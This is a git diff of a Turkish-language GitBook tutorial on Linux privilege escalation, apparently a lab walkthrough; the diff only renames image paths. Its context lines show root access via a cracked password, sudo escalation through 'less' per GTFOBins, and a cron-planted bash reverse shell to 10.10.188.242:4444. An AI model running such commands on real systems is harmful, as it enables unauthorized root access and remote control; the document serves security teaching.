@@ -44,7 +44,7 @@ Bu işlem sonucunda hashlenmiş şifre değerine ulaşıyoruz: `password123`
 
 Elde ettiğimiz şifre ile artık root olabiliriz.&#x20;
 
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Şifre kısmında elde ettiğimiz şifreyi giriyoruz "password123"</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p>Şifre kısmında elde ettiğimiz şifreyi giriyoruz "password123"</p></figcaption></figure>
 
 Root yetkilerine sahip olduktan sonra diğer yöntemlerle yetki yükseltmek için root yetkisinden `exit` komutuyla çıkıyoruz.
 
@@ -147,7 +147,7 @@ Gördüğümüz uygulamaların/komutların bize vermiş olduğu root yetkilerini
 
 GTFOBins sitesine giderek yukarıda karşımıza çıkan less komutunu arayacağız. GTFOBins sitesinde çeşitli uygulamalar için çeşitli yetki yükseltme teknikleri bulunmaktadır. Bizim burada aradığımız şey sudo yetkisiyle yetki yükseltme. &#x20;
 
-<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Kırmızı kutu içerisinde yazan komutları sırasıyla komut satırında çalıştırıyoruz.
 
@@ -365,7 +365,7 @@ bash -i >& /dev/tcp/10.10.188.242/4444 0>&1
 
 Bu komutu yazıp kaydettikten sonra kendi sistemimizde netcat ile dinleme yapmamız gerekiyor ve 1 dakika bekledikten sonra root yetkisine sahip oluyoruz.&#x20;
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ### Cron2
 
